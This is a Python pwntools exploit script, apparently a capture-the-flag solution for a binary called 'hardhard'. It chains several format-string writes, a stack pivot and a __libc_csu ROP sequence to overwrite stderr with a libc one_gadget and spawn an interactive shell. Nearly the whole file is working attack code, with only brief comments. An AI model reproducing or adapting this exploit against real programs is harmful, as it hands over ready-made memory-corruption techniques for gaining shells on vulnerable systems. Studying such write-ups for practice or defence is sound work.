from pwn import*
p = process('./hardhard')
# no_stdout !!!
# gadget
target = 0x601080
bss = 0x601100
read_printf = 0x4007A3
pop_rsp_ppp = 0x40082D
adc_rbp_edx = 0x4006E8
csu_setting = 0x40082A
csu_run = 0x400810
bss_stderr = 0x601040
libc_offset = 0xFFFFFFFFFFC3AAC0
one = [0x45216,0x4526a,0xf02a4,0xf1147]

# leak
p.recvuntil('gift: ')
tmp = int(p.recv(14),16)
print hex(tmp)

if tmp%0x10000 > 0x2000:	# stack addr condition by close(1)
	print 'fail'
	exit()

### controll
# first rip controll
pay = ''
pay += '%'+str(target+0x10-0x600de8)+'d%26$n'	# [0x7ffff7ffe168]=0x601080
pay += 'a'*0x16
pay += p64(read_printf)
pay += 'X'*0x10*9		# dummy for 0x601120 (pppp -> +0x20)

pay += p64(csu_setting)		# final exploit stage - 1
pay += p64(0)			# rbx
pay += p64(bss_stderr-0x48)	# rbp controll 
pay += p64(0x601178)		# r12
pay += p64(libc_offset+one[3])	# r13
pay += p64(0)			# r14 
pay += p64(0)			# r15
pay += p64(csu_run)
pay += p64(csu_setting)		# final exploit stage - 2
pay += p64(0)			# rbx
pay += 'a'*0x8			# rbp
pay += p64(0x601040)		# r12	exploit !!!
pay += p64(0x4006e8)		# r13 & 0x601178
pay += 'b'*0x8			# r14
pay += 'c'*0x8			# r15
pay += p64(csu_run)		# 	exploit !!!

p.send(pay)

## rip = read_printf
offset = tmp%0x100 + 0x20 - 0x30 - 0x8
print hex(offset)
pay = ''
pay += '%'+str(offset)+'d%18$hhn'
pay += '%'+str(163-offset)+'d%23$hhn'+'\x00'*0x10		# \x00 -> libc error control
p.send(pay)


# rip+0x8 = bss_addr
pay = ''
pay += '%13$ln'
pay += '%'+str(163)+'d%23$hhn'+'\x00'*0x10
p.send(pay)


##
pay = ''
pay += '%'+str(offset+1)+'d%18$hhn'
pay += '%'+str(163-offset-1)+'d%23$hhn'+'\x00'*0x10
p.send(pay)
#
pay = ''
pay += '%17d%13$hhn'
pay += '%'+str(163-17)+'d%23$hhn'+'\x00'*0x10
p.send(pay)

##
pay = ''
pay += '%'+str(offset+2)+'d%18$hhn'
pay += '%'+str(163-offset-2)+'d%23$hhn'+'\x00'*0x10	
p.send(pay)

#
pay = ''
pay += '%96d%13$hhn'
pay += '%'+str(163-96)+'d%23$hhn'+'\x00'*0x10
p.send(pay)
raw_input()

### exploit 
# rip = pop_rsp
pay = ''
pay += '%'+str(2093)+'d%23$hn'+'\x00'*0x10
p.send(pay)

# stderr -> one_gadget with adc gadget

p.interactive()


